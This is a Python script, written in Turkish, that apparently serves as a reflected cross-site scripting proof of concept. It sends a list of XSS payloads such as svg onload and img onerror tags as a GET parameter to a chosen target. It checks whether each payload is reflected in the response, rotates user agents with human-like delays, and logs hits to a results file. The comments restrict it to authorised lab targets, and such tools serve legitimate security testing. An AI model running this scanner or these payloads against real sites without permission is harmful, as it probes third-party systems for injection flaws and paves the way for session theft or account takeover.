#!/usr/bin/env python3
# reflected-xss-poc 
# Açıklama: Bu script Reflected XSS testleri için basit, bir PoC'tur.
# DİKKAT: Yalnızca izinli laboratuvar/VM/test ortamlarında çalıştırın.

from __future__ import annotations
import argparse, json, random, re, time, sys
from urllib.parse import quote_plus
import requests

class R:
    SARI = "\033[93m"; YESIL = "\033[92m"
    MAVI = "\033[96m"; KIRMIZI = "\033[91m"
    RESET = "\033[0m"; KALIN = "\033[1m"

def bilgi(m):   print(f"{R.MAVI}[BİLGİ]{R.RESET} {m}")
def basarili(m):print(f"{R.YESIL}[BAŞARILI]{R.RESET} {m}")
def uyari(m):   print(f"{R.SARI}[UYARI]{R.RESET} {m}")
def hata(m):    print(f"{R.KIRMIZI}[HATA]{R.RESET} {m}")

payloads_default = [
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><script>console.log(1)</script>',
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "PoC-Turk/1.0"
]

log_dosyasi = "results.jsonl"

def zaman_now(): return time.strftime("%Y-%m-%d %H:%M:%S")

def kayit_yaz(payload, status, url, basari):
    kayit = {
        "zaman": zaman_now(),
        "payload": payload,
        "status": status,
        "url": url,
        "basarili": bool(basari)
    }
    try:
        with open(log_dosyasi, "a", encoding="utf-8") as f:
            f.write(json.dumps(kayit, ensure_ascii=False) + "\n")
    except Exception as e:
        uyari(f"Log yazılamadı: {e}")

def yansima_var_mi(body: str, payload: str) -> bool:
    if payload in body:
        return True
    esc = payload.replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'", "&#x27;")
    if esc in body:
        return True
    if quote_plus(payload) in body:
        return True
    try:
        if re.search(re.escape(payload), body, flags=re.IGNORECASE):
            return True
    except re.error:
        pass
    return False

def sec_user_agent(deterministic: bool, no_rotate: bool) -> str:
    if deterministic or no_rotate:
        return "PoC-Turk/1.0"
    return random.choice(user_agents)

def tam_url(base: str, endpoint: str) -> str:
    return base.rstrip("/") + "/" + endpoint.lstrip("/")

def calistir(target: str, endpoint: str, param: str, payloads: list, delay: float = 1.0, timeout: int = 10, debug: bool = False, deterministic: bool = False, no_rotate: bool = False) -> int:
    hedef = tam_url(target, endpoint)
    bilgi(f"Hedef: {hedef}  |  Parametre: {param}")
    bilgi(f"Test edilecek payload sayısı: {len(payloads)}  |  Gecikme: {delay}s")

    bulunan = []
    for i, p in enumerate(payloads, start=1):
        ua = sec_user_agent(deterministic, no_rotate)
        headers = {"User-Agent": ua, "Accept": "*/*"}
        params = {param: p}

        if debug:
            bilgi(f"[{i}/{len(payloads)}] Gönderiliyor -> UA: {ua}  payload: {p!r}")

        try:
            r = requests.get(hedef, params=params, headers=headers, timeout=timeout, allow_redirects=True)
            st = r.status_code; body = r.text; final_url = r.url
            if debug:
                bilgi(f"HTTP {st} | URL: {final_url}")
        except KeyboardInterrupt:
            hata("Kullanıcı tarafından durduruldu. Çıkılıyor.")
            return 2
        except Exception as e:
            uyari(f"İstek başarısız oldu ({p!r}): {e}")
            kayit_yaz(p, None, None, False)
            try:
                time.sleep(delay)
            except KeyboardInterrupt:
                hata("Uyku sırasında iptal edildi.")
                return 2
            continue

        basari = yansima_var_mi(body, p)
        kayit_yaz(p, st, final_url, basari)

        if basari:
            basarili(f"Yansıma bulundu ({i}/{len(payloads)}): {p!r}")
            snippet = body[:300].replace("\n"," ").strip()
            print(f"    HTTP {st}  |  URL: {final_url}")
            print(f"    Snippet: {snippet}")
            bulunan.append({"payload": p, "status": st, "url": final_url})
        else:
            if debug:
                bilgi(f"[{i}/{len(payloads)}] Yansımadı: {p!r}")

        try:
            time.sleep(delay)
        except KeyboardInterrupt:
            hata("Uyku sırasında iptal edildi.")
            return 2

    print("\n" + "="*60)
    if bulunan:
        basarili(f"{len(bulunan)} payload yansıdı:")
        for idx, it in enumerate(bulunan, 1):
            print(f"  {idx}. {it['payload']!r}  (HTTP {it['status']})  URL: {it['url']}")
        print("-"*60)
        bilgi(f"Tüm denemeler `{log_dosyasi}` dosyasına kaydedildi — paylaşmadan önce kontrol edin.")
        return 0
    else:
        uyari("Hiçbir yansıma tespit edilmedi.")
        bilgi(f"Tüm denemeler `{log_dosyasi}` dosyasına kaydedildi — paylaşmadan önce kontrol edin.")
        return 3

def cli_args():
    p = argparse.ArgumentParser(prog="reflected-xss-poc", description="Reflected XSS PoC — yalnızca izinli test ortamları için.")
    p.add_argument("--target", required=True, help="Temel URL (ör. http://10.10.10.10:8000)")
    p.add_argument("--endpoint", default="/", help="Endpoint yolu (ör. /search)")
    p.add_argument("--param", default="q", help="Yansıtılan GET parametre adı (varsayılan: q)")
    p.add_argument("--payloads", nargs="*", help="Özel payload'lar (boşlukla ayır). Verilmezse varsayılanlar kullanılır.")
    p.add_argument("--delay", type=float, default=1.0, help="İstekler arası bekleme (saniye, insan-benzeri).")
    p.add_argument("--timeout", type=int, default=10, help="İstek zaman aşımı (saniye).")
    p.add_argument("--debug", action="store_true", help="Detaylı çıktı göster.")
    p.add_argument("--deterministic", action="store_true", help="Deterministik davranış (tek UA, tekrar üretilebilir).")
    p.add_argument("--no-ua-rotation", action="store_true", help="UA rotasyonunu kapat (tekrar üretilebilirlik için).")
    return p.parse_args()

def main():
    args = cli_args()
    payloads = args.payloads if args.payloads else payloads_default

    print(f"{R.KALIN}Reflected XSS PoC — Tamamen Türkçe{R.RESET}")
    print(f"{R.MAVI}Not: Yalnızca izinli test hedeflerinde çalıştırın. Log dosyası -> {log_dosyasi}{R.RESET}\n")

    try:
        rc = calistir(
            target=args.target,
            endpoint=args.endpoint,
            param=args.param,
            payloads=payloads,
            delay=args.delay,
            timeout=args.timeout,
            debug=args.debug,
            deterministic=args.deterministic,
            no_rotate=args.no_ua_rotation
        )
    except Exception as e:
        hata(f"Beklenmedik hata: {e}")
        rc = 4
    sys.exit(rc)

if __name__ == "__main__":
    main()